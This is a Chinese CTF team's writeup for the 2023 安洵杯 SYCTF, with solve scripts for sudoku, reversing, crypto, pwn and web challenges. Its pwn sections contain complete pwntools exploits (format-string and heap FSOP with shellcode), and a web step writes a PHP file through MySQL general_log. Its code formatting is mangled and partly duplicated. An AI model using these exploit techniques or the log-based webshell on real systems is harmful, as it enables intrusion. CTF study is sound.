# 2023 安洵杯SYCTF writeup by Arr3stY0u

> 原文: https://www.ctfiot.com/120089.html
> ID: 120089

-——————– 800103720 023840650 410006008 300001062 000052407 072060090 160000375 205019846 000030000 -——————–

def parse_input(input_list): board = []
 for row in input_list: nums = list(map(int, row)) board.append(nums)
 return board
def format_output(board): formatted = "" for row in board: formatted += "".join(map(str, row)) + "n" return formatted.strip()

def find_empty(board): for row in range(9): for col in range(9): if board[row][col] == 0: return row, col return None

def is_valid(board, num, pos): row, col = pos for i in range(9): if board[row][i] == num and col != i: return False if board[i][col] == num and row != i: return False
 box_row = row // 3 box_col = col // 3
 for i in range(box_row * 3, box_row * 3 + 3): for j in range(box_col * 3, box_col * 3 + 3): if board[i][j] == num and (i, j) != pos: return False
 return True

def solve(board): find = find_empty(board) if not find: return True else: row, col = find
 for i in range(1, 10): if is_valid(board, i, (row, col)): board[row][col] = i
 if solve(board): return True
 board[row][col] = 0
 return False
def parse_input(input_list): board = []
 for row in input_list: nums = list(map(int, row)) board.append(nums)
 return board
def format_output(board): formatted = "" for row in board: formatted += "".join(map(str, row)) + "n" return formatted.strip()
# input_string = '''---------------------# 800103720# 023840650# 410006008# 300001062# 000052407# 072060090# 160000375# 205019846# 000030000# ---------------------# now give me you solve:'''
# lists=input_string.split('n')[1:10]# board = parse_input(lists)# print(board)# solve(board)# print(board)
from pwn import *
# 创建连接conn = remote('47.108.165.60',27539)
# 接收欢迎信息for i in range(7): msg = conn.recvuntil("Please input:").strip().decode("utf-8") print(msg) # 发送选择 conn.sendline('1'.encode())
 # 接收下一步提示 msg = conn.recvuntil("Please select the level:").strip().decode("utf-8") print(msg)
 conn.sendline('5'.encode())
 msg = conn.recvuntil("clock start").strip().decode("utf-8") print(msg) time.sleep(5)
 msg = conn.recvuntil("now give me you solve:").strip().decode("utf-8") print(msg) lists = msg.split('n')[1:10] board = parse_input(lists) solve(board) solved = format_output(board) conn.sendline(solved.encode())
conn.interactive()getflag

kali :: ~ 127 » telnet 47.108.165.60 37569Trying 47.108.165.60...Connected to 47.108.165.60.Escape character is '^]'.
Ubuntu 22.04.2 LTSWelcome to Play Sudoku Game!Play(1)Exit(2)Please input> 1
Tips:R to replayQ to exitWASD to moveYou have 10000ms to solve it :)Please select the leveleasy(5)normal(6)hard(7)>5

def solve(input_string): original_board = parse_input(input_string)# 创建原始数组的副本 board_copy = [row[:] for row in original_board]

 solution = solve_sudoku(original_board) # print(board_copy) # print(solution) lists=[] for i in range(9): for j in range(9): if board_copy[i][j] == 0: lists.append(str(solution[i][j])) if j != 8: lists.append('d') lists.extend('saaaaaaaa') # print(f"索引为 ({i}, {j}) 的位置，填入数字 {solution[i][j]}") return lists

-———————— 4 3 0 | 0 0 6 | 2 0 0 | 8 0 0 | 0 7 0 | 0 0 3 | 2 0 7 | 0 5 0 | 1 4 6 | -———————— 0 0 0 | 0 0 0 | 0 7 5 | 7 5 0 | 8 0 0 | 6 2 0 | 0 2 9 | 7 3 5 | 0 1 0 | -———————— 5 6 0 | 4 0 3 | 0 9 0 | 0 0 2 | 5 0 0 | 8 0 0 | 3 0 1 | 0 8 2 | 0 6 4 |

def parse_input(input_string): rows = input_string.strip().split('n') board = []
 for row in rows: row = row.replace('-', '').replace('|', '').split() nums = [int(num) if num != '0' else 0 for num in row] if nums!=[]: board.append(nums)
 return board

import telnetlibdef solve_sudoku(board): if is_complete(board): return board
 row, col = find_empty_cell(board) for num in range(1, 10): if is_valid(board, row, col, num): board[row][col] = num if solve_sudoku(board): return board board[row][col] = 0
 return None
def is_complete(board): for row in board: if 0 in row: return False return True
def find_empty_cell(board): for i in range(9): for j in range(9): if board[i][j] == 0: return i, j return None, None
def is_valid(board, row, col, num): # Check row if num in board[row]: return False
 # Check column for i in range(9): if board[i][col] == num: return False
 # Check 3x3 box box_row = (row // 3) * 3 box_col = (col // 3) * 3 for i in range(box_row, box_row + 3): for j in range(box_col, box_col + 3): if board[i][j] == num: return False
 return True
def parse_input(input_string): rows = input_string.strip().split('n') board = []
 for row in rows: row = row.replace('-', '').replace('|', '').split() nums = [int(num) if num != '0' else 0 for num in row] if nums!=[]: board.append(nums)
 return board
def solve(input_string): original_board = parse_input(input_string)# 创建原始数组的副本 board_copy = [row[:] for row in original_board]

 solution = solve_sudoku(original_board) # print(board_copy) # print(solution) lists = [] for i in range(9): for j in range(9): if board_copy[i][j] == 0: lists.append(str(solution[i][j])) if j != 8: lists.append('d') lists.extend('saaaaaaaa') # print(f"索引为 ({i}, {j}) 的位置，填入数字 {solution[i][j]}") return lists
tn = telnetlib.Telnet('47.108.165.60',36697)
welcome_msg = tn.read_until(b"Please input")print(welcome_msg.decode("utf-8"))
# 发送返回值到服务器tn.write("1".encode("utf-8") + b"n")
msg = tn.read_until(b"hard(7)")print(msg.decode("utf-8"))
tn.write("5".encode("utf-8") + b"n")
msg = ''for i in range(15): response = tn.read_until(b"n") # print((response)) response = response.replace(b'x1b[7;32m',b'').replace(b'x1b[0m',b'').replace(b'x1b[1;32m',b'').replace(b'x1b[Hx1b[2J',b'') msg += response.decode().strip('> 5')tn.write(str(solve(msg)).encode("utf-8") + b"n")tn.interact()

import librosaimport soundfile as sfimport numpy as np
audio1, sr1 = librosa.load('2.wav', sr=None)audio2, sr2 = librosa.load('3.wav', sr=None)
result = 2*audio1-audio2sf.write('result.wav', result, sr1)

.text:00413CFA jmp short loc_413D19.text:00413CFA ; ---------------------------------------------------------------------------.text:00413D19 loc_413D19: ; CODE XREF: .text:00413CFA↑j.text:00413D19 push ecx.text:00413D1A nop.text:00413D1B call ds:__imp_exit

import stringimport osimport time
table = string.ascii_letters+string.digits+'!-{}'# table = string.printable# 'SYC{Y3S-yE5-y0u-S0Ve-Th3-C9P!!!}'theflag = ''while len(theflag) < 32: for ch in table: flag = (theflag+ch).ljust(32, '#') exitcode = os.system(f"echo {flag} | ez_cpp3.exe 1>&0") if exitcode >= len(theflag) + 1: theflag += ch print(theflag, exitcode) break else: print('not found') time.sleep(0.1)

m = ['#', ' ', '2', '$', '3', '@', '5']
for level in range(6): print('level', level) for y in range(10): line = '' for x in range(10): n = ida_bytes.get_dword(0x140005040+(level*100+y*10+x)*4) line += m[n] print(line)

level 0 跳 1-?-0## ######### #### #### # #### # ####### # *衔接1 wddwwdddddD## # ####### *衔接1 ##4# ########$#########*###### w
level 5 可以跳回 0-9-3###*######### ######### ######### ######### ######## ######## #######* ####### ddwwdwwwwwW####################
level 1########### ###### ## *衔接2 dwwwdddsdddddD# ########* ##################* ###################################
level 3 可以跳到5-7-0##*####### sssssssssS## ######### # ###### ## ##### ######## ######## ## ##### # ###### #########*#######
level 2 可以跳到4-0-9*######### wwW #########*## # ### ## # # # ### #### ##### ### ###### ## #### # ## ##### ### ############
level 4 可以跳3-0-2######## * 从2过来 ######## #* # assaaaaaaaaA######################################################################

00000000000111111111111112224444444444443333333333555555555550wddwwdddddDdwwwdddsdddddDwwWassaaaaaaaaAsssssssssSddwwdwwwwwWw

import ctypesfrom Crypto.Cipher import ARC4from hashlib import md5
libc = ctypes.CDLL("ucrtbase.dll")libc.srand.argtypes = [ctypes.c_uint]libc.rand.restype = ctypes.c_int
srand = libc.srandrand = libc.rand
srand(0x94307F97)seed_list = []for i in range(361): seed_list.append(rand())

def enc(buf, size, seed): srand(seed) keysize = int(rand()*1.0/32767.0 * 256.0) table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789x00' pwd = '' for i in range(keysize): idx = int(rand()*1.0 / 32767.0 * 63.0) pwd += table[idx]
 cipher = ARC4.ARC4Cipher(pwd.encode()) xorstream = b'x00'*size xorstream = cipher.encrypt(xorstream) outbuf = bytearray(buf) for i in range(size): outbuf[i] ^= xorstream[i] return bytes(outbuf)

foods = []for i in range(361): srand(seed_list[i]) while 1: y = rand() % 20 x = rand() % 20 if not (x == 0 or x == 19 or y == 0 or y == 19): # print(i, y, x) foods.append((y, x)) break

tmp = 0x92
data = b'x02'for i in range(2): data += bytes([data[-1] ^ 0xBE])# print(data.hex())
flag_data = data[:]eat_count = 361 # 初始长度就是3, 但是要求吃361个 ???for i in range(eat_count): y, x = foods[i] pos = y << 8 | x data = enc(data, 3+i, pos) # print(data.hex())
 _tmp = tmp # print(hex(tmp-1), hex(data[0]-1)) tmp = ((tmp-1) ^ (data[0]-1)) & 0xFF flag_data = data[:] data = data[::-1] data += bytes([_tmp]) # print(hex(tmp))
s = flag_data.ljust(361, b'x00').hex().encode()print('flag_data', len(flag_data))print('SYC{'+md5(s[:722]).hexdigest()+'}')

0129FE14 53 59 43 7B 54 68 31 73 5F 69 73 5F 40 5F 45 61 SYC{Th1s_is_@_Ea 0129FE24 73 59 5F 33 6E 63 72 79 70 74 4F 21 21 21 21 7D sY_3ncryptO!!!!}

from claripy import *from libnum import *

tmp_flag = [BVS(f'flag{i}', 8) for i in range(30)]# x_flag = b'111111111122222222223333333333'# tmp_flag = [BVV(x_flag[i], 8) for i in range(30)]flag = Concat(*tmp_flag)unk = 9

def enc1(): global unk unk += 1 if unk & 1 == 0: for i in range(30): tmp_flag[i] = (unk+tmp_flag[i]) ^ 0x17

def enc2(): global unk unk += 1 tmp_flag[0] += 2 tmp_flag[1] -= 28 tmp_flag[2] ^= 0x47 tmp_flag[3] += tmp_flag[4] tmp_flag[5] += 73 tmp_flag[6] += 12 tmp_flag[7] -= tmp_flag[8] tmp_flag[8] ^= 0x5A tmp_flag[9] ^= 0x22 tmp_flag[10] += 20 tmp_flag[12] -= 84 tmp_flag[13] ^= 4 tmp_flag[14] ^= 0x1C tmp_flag[17] -= 1 tmp_flag[27] ^= 0x11 tmp_flag[28] ^= 3

def enc3(): global unk if unk % 3 == 2: v13 = 0 v11 = 29 while v13 < 15: tmp_flag[v13], tmp_flag[v11] = tmp_flag[v11], tmp_flag[v13] v13 += 1 v11 -= 1 unk += 1

solve = Solver()for i in range(4): enc1() enc2() enc3()
print(hex(unk))
enc_flag = bytes.fromhex( '4D635D344309A2770ABFC9B3E96F797D7BE899904308BB990E2ED47B27B7')
for i in range(30): solve.add(enc_flag[i] == tmp_flag[i])

for k in solve.eval(flag, 2): print(n2s(k))
# b'SYC{I_h0pE_you_cAn_FInd_d4eam}'

unsigned int fin[36] = { 0x0003B148, 0x000D2CAE, 0x0003A1FB, 0x00044F40, 0x000472DE, 0x0000CCC0, 0x00001888, 0x00003B80, 0x000702F7, 0x000C745C, 0x000658E0, 0x000858D4, 0x0000D5BD, 0x00004860, 0x0014F410, 0x0002CB9F, 0x000321DB, 0x0014D534, 0x00025DA0, 0x0006898C, 0x00123D56, 0x00058E4D, 0x00050CF8, 0x00005D64, 0x000978BA, 0x0008F290, 0x0003B568, 0x00054696, 0x00094C12, 0x0001021F, 0x000DBACB, 0x00049680, 0x0002FABD, 0x000F2B58, 0x0012D23C, 0x0014AED3 }; unsigned long mul[36] = { 0x0000000000000D21, 0x000000000000009D, 0x000000000000094B, 0x00000000000003C9, 0x0000000000000C3F, 0x00000000000017E9, 0x000000000000130E, 0x0000000000000088,0x0000000000000486, 0x000000000000202F, 0x0000000000002230, 0x00000000000024B4, 0x00000000000008B1, 0x0000000000000A9F, 0x0000000000001AD2, 0x00000000000023EB, 0x0000000000000C7E, 0x000000000000042B, 0x00000000000005BF, 0x000000000000113C,0x0000000000000449, 0x0000000000001751, 0x0000000000000ACE, 0x0000000000001894, 0x000000000000208A, 0x0000000000000E82, 0x00000000000006BD, 0x0000000000000CEE,0x0000000000002386, 0x00000000000013D4, 0x0000000000000111, 0x0000000000000D1C, 0x000000000000238E, 0x0000000000001759, 0x000000000000012B, 0x000000000000214D }; unsigned char flag[40] = { 0 }; unsigned long* a = &mul[18]; for (int i = 0; i < 36; i += 6) { flag[i] = fin[i] / (*(a - 18)); flag[i + 1] = fin[i + 1] / (*(a - 12)); flag[i + 2] = fin[i + 2] / (*(a - 6)); flag[i + 3] = fin[i + 3] / (*(a)); flag[i + 4] = fin[i + 4] / (*(a + 6)); flag[i + 5] = fin[i + 5] / (*(a + 12)); a++; } int j = 0; for (int i = 35; i >= 0; --i) { flag[i] ^= flag[j++]; flag[i] = ((flag[i] >> 4) | (flag[i] << 4)) & 0xff; } printf("%s", flag);

p.recvuntil(' game!n')p.send(b'a'*28+p32(0))rand_list=[1804289348,846930915,1681692750,1714636888,1957747830,424238300,719885423,1649760457,596516622,1189641450,1025202335,1350490000,783368663,1102520032,2044897736,1967513955,1365180505,1540383463,304089201,1303455709,35005248]for i in range(len(rand_list)):p.recvuntil('input:')p.sendline(str(rand_list[i]))

from pwn import *context(os='linux', arch='amd64')#, log_level='debug')
procname = './pwn'libcname = './libc.so.6'
# io = process(procname, stdin=PTY)io = remote('47.108.165.60', 47744)elf = ELF(procname)libc = ELF(libcname)
n2b = lambda x : str(x).encode()rv = lambda x : io.recv(x)ru = lambda s : io.recvuntil(s, drop=True)sd = lambda s : io.send(s)sl = lambda s : io.sendline(s)sn = lambda s : sl(n2b(n))sa = lambda p, s : io.sendafter(p, s)sla = lambda p, s : io.sendlineafter(p, s)sna = lambda p, n : sla(p, n2b(n))ia = lambda : io.interactive()rop = lambda r : flat([p64(x) for x in r])
sa(b' game!n', b'a' * 28 + p32(0))rand_list=[1804289348,846930915,1681692750,1714636888,1957747830,424238300,719885423,1649760457,596516622,1189641450,1025202335,1350490000,783368663,1102520032,2044897736,1967513955,1365180505,1540383463,304089201,1303455709,35005248]
for i in range(len(rand_list)): sla(b'input:', str(rand_list[i]).encode())
sa(b'input your data ;)n', b'%pAAAA ')heap = int(ru(b'AAAA'), 16)success(f'leak heap: {hex(heap)}')
sa(b'input your data ;)n', b'%11$llxAAAA ')libc.address = int(ru(b'AAAA'), 16) - libc.sym.__libc_start_main + 128 - 0x50success(f'leak libc.address: {hex(libc.address)}')
printf_arginfo = libc.address + 0x21A8B0success(f'printf_arginfo: {hex(printf_arginfo)}')printf_functable = libc.address + 0x21b9c8success(f'printf_functable: {hex(printf_functable)}')
sa(b'input your data ;)n', b'%15$pAAAA ')stack = int(ru(b'AAAA'), 16)success(f'leak stack: {hex(stack)}')
ra = stack - 0x110
sa(b'input your data ;)n', f'%{ra&0xffff}c%15$hn '.encode())sa(b'input your data ;)n', f'%{printf_arginfo&0xffff}c%45$hn '.encode())
sa(b'input your data ;)n', f'%{(ra + 2)&0xffff}c%15$hn '.encode())sa(b'input your data ;)n', f'%{(printf_arginfo >> 16) & 0xff}c%45$hhn '.encode())
sa(b'input your data ;)n', f'%{ra&0xffff}c%15$hn '.encode())sa(b'input your data ;)n', f'%{heap&0xffff}c%11$hn '.encode())
sa(b'input your data ;)n', f'%{(printf_arginfo + 2) & 0xff}c%45$hhn '.encode())sa(b'input your data ;)n', f'%{(heap >> 16)&0xffff}c%11$hn '.encode())
sa(b'input your data ;)n', f'%{(printf_arginfo + 4) & 0xff}c%45$hhn '.encode())sa(b'input your data ;)n', f'%{(heap >> 32)&0xffff}c%11$hn '.encode())
sa(b'input your data ;)n', f'%{printf_functable & 0xffff}c%45$hn '.encode())sa(b'input your data ;)n', b'A%11$hhn ')
import subprocessdef get_one_gadgets(): one_gadgets = [int(i) + libc.address for i in subprocess.check_output(['one_gadget', '-l', '1', '--raw', libcname]).decode().split(' ')] debug(f'search one gadgets from {libcname}: {[hex(i) for i in one_gadgets]}') return one_gadgets
import syssa(b'input your data ;)n', b'%A'.ljust(8, b' ') + p64(get_one_gadgets()[int(sys.argv[1])]) * 0x41)
ia()

from pwn import *context(os='linux', arch='amd64')#, log_level='debug')
procname = './pwn'libcname = './libc.so.6'
# io = process(procname, stdin=PTY)io = remote('47.108.165.60', 22692)elf = ELF(procname)libc = ELF(libcname)
n2b = lambda x : str(x).encode()rv = lambda x : io.recv(x)ru = lambda s : io.recvuntil(s, drop=True)sd = lambda s : io.send(s)sl = lambda s : io.sendline(s)sn = lambda s : sl(n2b(n))sa = lambda p, s : io.sendafter(p, s)sla = lambda p, s : io.sendlineafter(p, s)sna = lambda p, n : sla(p, n2b(n))ia = lambda : io.interactive()rop = lambda r : flat([p64(x) for x in r])
def leakaddr(pre = None, suf = None, bit = 64, keepsuf = True, off = 0): u = {64: u64, 32: u32} num = 6 if bit == 64 else 4 if pre is not None: ru(pre) if suf is not None: r = ru(suf) if keepsuf: r += suf r = r[-num:] else: r = rv(num) return u[bit](r.ljust(bit//8, b' ')) - off
prompt = b':'prompt_menu = b'>> n'prompt_idx = prompt
op = lambda x : sla(prompt_menu, n2b(x))snap = lambda n : sna(prompt, n)sidx = lambda x : sla(prompt_idx, n2b(x))sap = lambda s : sa(prompt, s)slap = lambda s : sla(prompt, s)
def add(size, content): op(1) snap(size) sap(content)
def edit(idx, content): op(4) sidx(idx) sap(content)
def show(idx): op(3) sidx(idx)
def free(idx): op(2) sidx(idx)
add(0x90, b' ')add(0x90, b'1')free(0)add(0x90, b' ')show(0)heap = leakaddr(pre=b'context:n') << 12success(f'leak heap: {hex(heap)}')free(0)free(1)
fake_chunk = heap + 0x3e0
add(0xf10, rop([0, 0x1EA1, fake_chunk, fake_chunk]))add(0xef0, b'1')add(0x88, b'2')add(0xef0, b'3')add(0xa0, b'4')
edit(2, b'a' * 0x80 + p64(0x1EA0))# pause()free(3)
show(0)libc.address = leakaddr(suf=b'x7f', off=0x219CE0)success(f'leak libc.address: {hex(libc.address)}')
pause()
add(0x300, b'3')add(0x300, b'5')
free(5)free(3)
ptr = libc.sym._IO_list_allfd = (fake_chunk >> 12) ^ ptredit(0, rop([0, 0x310, fd]))
fake_io_addr = fake_chunk + 0x10frame_addr = fake_io_addr + 0x100
frame = SigreturnFrame()frame.rip = libc.sym.mprotectframe.rdi = heapframe.rsi = 0x10000frame.rdx = 7frame.rsp = fake_io_addr + 0xf0
code_addr = frame_addr + len(bytes(frame))
fake_io_file = rop([ u64(b'/flag'.ljust(8, b' ')), 0, # 0x00 1, libc.sym.setcontext + 0x3d, # 0x10 1, frame_addr, # 0x20 0, 0, # 0x30 0, 0, # 0x40 0, 0, # 0x50 0, 0, # 0x60 0, 0, # 0x70 0, heap, # 0x80 0, 0, # 0x90 fake_io_addr + 8, 0, # 0xa0 0, 0, # 0xb0 1, 0, # 0xc0 0, libc.sym._IO_wfile_jumps + 0x30, # 0xd0 0, fake_io_addr, # 0xe0 code_addr, 0, # 0xf0])
code = shellcraft.open(fake_io_addr, 0) + shellcraft.sendfile(2, 3, 0, 0x50)
payload = fake_io_file + bytes(frame) + asm(code) + b' ' * 10
add(0x300, payload)
add(0x300, p64(fake_io_addr))
ia()

import gmpy2
from Crypto.Util.number import long_to_bytes

#求出data1，data2
data3=1.42870767357206600351348423521722279489230609801270854618388981989800006431663026299563973511233193052826781891445323183272867949279044062899046090636843802841647378505716932999588

c = continued_fraction(data3)
print(c)

alist = c.convergents()
print(alist)

for i in alist:
 a = str(i).split('/')
 if len(a) > 1 and gcd(int(a[0]), int(a[1])) == 1 and is_prime(int(a[0])) and is_prime(int(a[1])) and int(
 a[0]).bit_length() == 256 and int(a[1]).bit_length() == 256:
 print(a)
 break
#['97093002077798295469816641595207740909547364338742117628537014186754830773717', '67958620138887907577348085925738704755742144710390414146201367031822084270769']

#解密leak得到p-q
data1=97093002077798295469816641595207740909547364338742117628537014186754830773717
data2=67958620138887907577348085925738704755742144710390414146201367031822084270769
leak=1788304673303043190942544050868817075702755835824147546758319150900404422381464556691646064734057970741082481134856415792519944511689269134494804602878628
e=data1
n=data1*data2
phi = (data1-1) * (data2-1)
d = gmpy2.invert(e,phi)
p_q = gmpy2.powmod(leak,d,n)
print(p_q)

#求解p，q
p_q=57684649402353527014234479338961992571416462151551812296301705975419997474236
n=2793178738709511429126579729911044441751735205348276931463015018726535495726108249975831474632698367036712812378242422538856745788208640706670735195762517
e = 65537
c = 1046004343125860480395943301139616023280829254329678654725863063418699889673392326217271296276757045957276728032702540618505554297509654550216963442542837
var("p,q")
eq1= p-q ==p_q
eq2= p*q ==n
sol = solve([eq1,eq2], p, q)
print(sol)

p = 89050782851818876669770322556796705712770640993210984822169118425068336611139
q = 31366133449465349655535843217834713141354178841659172525867412449648339136903
phi = (q-1) * (p-1)
d = gmpy2.invert(e,phi)
m = gmpy2.powmod(c,d,n)-data2
print(m)
print(long_to_bytes(m))

$$P=m^p pmod {p*q*r} \
Q=m^q pmod {p*q*r} \
R=m^R pmod {p*q*r} \

费马小定理：\
m^p=m pmod p \
P=m+k1*p+k2*pqr=m+k3*p \
Q,R同理 \qquadtext{(1)}$$

$$P=m+k3*p\
Q=m+k4*q\
R=m+k5*r\

k_3p=P-M,k_4q=Q-m,k_5r=R-m\

P*Q*R-m^3-m*(P-m)*(Q-m)-m^2*((P-m)+(Q-m))-(R-m)*m^2-m*((P-m)+(Q-m))*(R-m)equiv 0 pmod nqquadtext{(2)}$$

from Crypto.Util.number import *
import gmpy2 
#coppersmith
clown = 128259792862716016839189459678072057136816726330154776961595353705839428880480571473066446384217522987161777524953373380960754160008765782711874445778198828395697797884436326877471408867745183652189648661444125231444711655242478825995283559948683891100547458186394738621410655721556196774451473359271887941209
trick = 13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464455212126838976863742628716168391373019631629866746550551576576

n = clown
p = trick

pbits = 512
kbits = 220
p=p>>kbits<<kbits
PR.<x> = PolynomialRing(Zmod(n))
f = x + p
x0 = f.small_roots(X=2^kbits, beta=0.4)
p=p+int(x0[0])
print(p)

#构建关于m的多项式求解即可，m即为r
n = 924936528644761261915490226270682878749572154775391302241867565751616615723850084742168094776229761548826664906020127037598880909798055174894996273670320006942669796769794827782190025101253693980249267932225152093301291975335342891074711919668098647971235568200490825183676601392038486178409517985098598981313504275523679007669267428032655295176395420598988902864122270470643591017567271923728446920345242491655440745259071163984046349191793076143578695363467259
P = 569152976869063146023072907832518894975041333927991456910198999345700391220835009080679006115013808845384796762879536272124713177039235766835540634080670611913370463720348843789609330086898067623866793724806787825941048552075917807777474750280276411568158631295041513060119750713892787573668959642318994049493233526305607509996778047209856407800405714104373282610244944206314614906974275396096712817649817035559000245832673082730407216670764400076473183825246052
Q = 600870923560313304359037202752076267074889238956345564584928427345594724253036201151726541881494799597966727749590645445697106549304014936202421316051605075583257261728145977582815350958084624689934980044727977015857381612608005101395808233778123605070134652480191762937123526142746130586645592869974342105683948971928881939489687280641660044194168473162316423173595720804934988042177232172212359550196783303829050288001473419477265817928976860640234279193511499
R = 502270534450244040624190876542726461324819207575774341876202226485302007962848054723546499916482657212105671666772860609835378197021454344356764800459114299720311023006792483917490176845781998844884874288253284234081278890537021944687301051482181456494678641606747907823086751080399593576505166871905600539035162902145778102290387464751040045505938896117306913887015838631862800918222056118527252590990688099219298296427609455224159445193596547855684004680284030

PR.<m> = PolynomialRing(Zmod(n))
f = P*Q*R-m*m*m-m*(P-m)*(Q-m)-m*m*((P-m)+(Q-m))-(R-m)*m*m-m*((P-m)+(Q-m))*(R-m)
f = f.monic()
m = f.small_roots(X=2^280, beta=0.4)
print(m)

r=m

#直接解密即可
r=105960538296223496551922954965164644267919720177702173352061963871195469608683
p=13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464531559991042565319610790540616696456104018890243275374098291711
c = 10585127810518527980133202456076703601165893288538440737356392760427497657052118442676827132296111066880565679230142991175837099225733564144475217546829625689104025101922826124473967963669155549692317699759445354198622516852708572517609971149808872997711252940293211572610905564225770385218093601905012939143618159265562064340937330846997881816650140361013457891488134685547458725678949
e = 65537
n=p*r
phi = (r-1) * (p-1)
d = gmpy2.invert(e,phi)
m = gmpy2.powmod(c,d,n)
print(m)
print(long_to_bytes(m))

from random import randintimport gmpy2 as gpfrom Crypto.Util.number import *from Crypto.Cipher import AESfrom hashlib import md5from binascii import *
from tqdm import tqdm
a = 12760960185046114319373228302773710922517145043260117201359198182268919830481221094839217650474599663154368235126389153552714679678111020813518413419360215b = 10117047970182219839870108944868089481578053385699469522500764052432603914922633010879926901213308115011559044643704414828518671345427553143525049573118673m = 9088893209826896798482468360055954173455488051415730079879005756781031305351828789190798690556659137238815575046440957403444877123534779101093800357633817seq = [1588310287911121355041550418963977300431302853564488171559751334517653272107112155026823633337984299690660859399029380656951654033985636188802999069377064, 12201509401878255828464211106789096838991992385927387264891565300242745135291213238739979123473041322233985445125107691952543666330443810838167430143985860, 13376619124234470764612052954603198949430905457204165522422292371804501727674375468020101015195335437331689076325941077198426485127257539411369390533686339, 8963913870279026075472139673602507483490793452241693352240197914901107612381260534267649905715779887141315806523664366582632024200686272718817269720952005, 5845978735386799769835726908627375251246062617622967713843994083155787250786439545090925107952986366593934283981034147414438049040549092914282747883231052, 9415622412708314171894809425735959412573511070691940566563162947924893407832253049839851437576026604329005326363729310031275288755753545446611757793959050, 6073533057239906776821297586403415495053103690212026150115846770514859699981321449095801626405567742342670271634464614212515703417972317752161774065534410, 3437702861547590735844267250176519238293383000249830711901455900567420289208826126751013809630895097787153707874423814381309133723519107897969128258847626, 2014101658279165374487095121575610079891727865185371304620610778986379382402770631536432571479533106528757155632259040939977258173977096891411022595638738, 10762035186018188690203027733533410308197454736009656743236110996156272237959821985939293563176878272006006744403478220545074555281019946284069071498694967]ct = 0x37dc072bdf4cdc7e9753914c20cbf0b55c20f03249bacf37c88f66b10b72e6e678940eecdb4c0be8466f68fdcd13bd81
n = 2023
def seqsum(i): ans = 0 for j in range(len(seq)): ans += gp.powmod(i, j, m) * seq[j] return ans

def home1work(n): if n == 1: return 1 elif n == 2: return 1 else: previous, current = 1, 1 for i in tqdm(range(3, n + 1)): previous, current = current, (a * current + b * previous + seqsum(i)) % m return current
ans = home1work(n)
k = unhexlify(md5(str(ans).encode()).hexdigest())aes = AES.new(k, AES.MODE_ECB)#data = flag + (16 - len(flag) % 16) * b"x00"data=long_to_bytes(ct)ct = aes.decrypt(data)print(ct)#b"c7ceedc7197a0d350025fff478f667293ebbaa6b'x00x00x00x00x00x00x00"

set global general_log='on'
set global general_log_file='/var/www/html/sEcR@t_n@Bodyknow.php'


```
-——————– 800103720 023840650 410006008 300001062 000052407 072060090 160000375 205019846 000030000 -——————–
```



```
def parse_input(input_list): board = []
 for row in input_list: nums = list(map(int, row)) board.append(nums)
 return board
def format_output(board): formatted = "" for row in board: formatted += "".join(map(str, row)) + "n" return formatted.strip()
```



```
def find_empty(board): for row in range(9): for col in range(9): if board[row][col] == 0: return row, col return None

def is_valid(board, num, pos): row, col = pos for i in range(9): if board[row][i] == num and col != i: return False if board[i][col] == num and row != i: return False
 box_row = row // 3 box_col = col // 3
 for i in range(box_row * 3, box_row * 3 + 3): for j in range(box_col * 3, box_col * 3 + 3): if board[i][j] == num and (i, j) != pos: return False
 return True

def solve(board): find = find_empty(board) if not find: return True else: row, col = find
 for i in range(1, 10): if is_valid(board, i, (row, col)): board[row][col] = i
 if solve(board): return True
 board[row][col] = 0
 return False
def parse_input(input_list): board = []
 for row in input_list: nums = list(map(int, row)) board.append(nums)
 return board
def format_output(board): formatted = "" for row in board: formatted += "".join(map(str, row)) + "n" return formatted.strip()
# input_string = '''---------------------# 800103720# 023840650# 410006008# 300001062# 000052407# 072060090# 160000375# 205019846# 000030000# ---------------------# now give me you solve:'''
# lists=input_string.split('n')[1:10]# board = parse_input(lists)# print(board)# solve(board)# print(board)
from pwn import *
# 创建连接conn = remote('47.108.165.60',27539)
# 接收欢迎信息for i in range(7): msg = conn.recvuntil("Please input:").strip().decode("utf-8") print(msg) # 发送选择 conn.sendline('1'.encode())
 # 接收下一步提示 msg = conn.recvuntil("Please select the level:").strip().decode("utf-8") print(msg)
 conn.sendline('5'.encode())
 msg = conn.recvuntil("clock start").strip().decode("utf-8") print(msg) time.sleep(5)
 msg = conn.recvuntil("now give me you solve:").strip().decode("utf-8") print(msg) lists = msg.split('n')[1:10] board = parse_input(lists) solve(board) solved = format_output(board) conn.sendline(solved.encode())
conn.interactive()getflag
```



```
kali :: ~ 127 » telnet 47.108.165.60 37569Trying 47.108.165.60...Connected to 47.108.165.60.Escape character is '^]'.
Ubuntu 22.04.2 LTSWelcome to Play Sudoku Game!Play(1)Exit(2)Please input> 1
Tips:R to replayQ to exitWASD to moveYou have 10000ms to solve it :)Please select the leveleasy(5)normal(6)hard(7)>5
```



```
def solve(input_string): original_board = parse_input(input_string)# 创建原始数组的副本 board_copy = [row[:] for row in original_board]

 solution = solve_sudoku(original_board) # print(board_copy) # print(solution) lists=[] for i in range(9): for j in range(9): if board_copy[i][j] == 0: lists.append(str(solution[i][j])) if j != 8: lists.append('d') lists.extend('saaaaaaaa') # print(f"索引为 ({i}, {j}) 的位置，填入数字 {solution[i][j]}") return lists
```



```
-———————— 4 3 0 | 0 0 6 | 2 0 0 | 8 0 0 | 0 7 0 | 0 0 3 | 2 0 7 | 0 5 0 | 1 4 6 | -———————— 0 0 0 | 0 0 0 | 0 7 5 | 7 5 0 | 8 0 0 | 6 2 0 | 0 2 9 | 7 3 5 | 0 1 0 | -———————— 5 6 0 | 4 0 3 | 0 9 0 | 0 0 2 | 5 0 0 | 8 0 0 | 3 0 1 | 0 8 2 | 0 6 4 |
```



```
def parse_input(input_string): rows = input_string.strip().split('n') board = []
 for row in rows: row = row.replace('-', '').replace('|', '').split() nums = [int(num) if num != '0' else 0 for num in row] if nums!=[]: board.append(nums)
 return board
```



```
import telnetlibdef solve_sudoku(board): if is_complete(board): return board
 row, col = find_empty_cell(board) for num in range(1, 10): if is_valid(board, row, col, num): board[row][col] = num if solve_sudoku(board): return board board[row][col] = 0
 return None
def is_complete(board): for row in board: if 0 in row: return False return True
def find_empty_cell(board): for i in range(9): for j in range(9): if board[i][j] == 0: return i, j return None, None
def is_valid(board, row, col, num): # Check row if num in board[row]: return False
 # Check column for i in range(9): if board[i][col] == num: return False
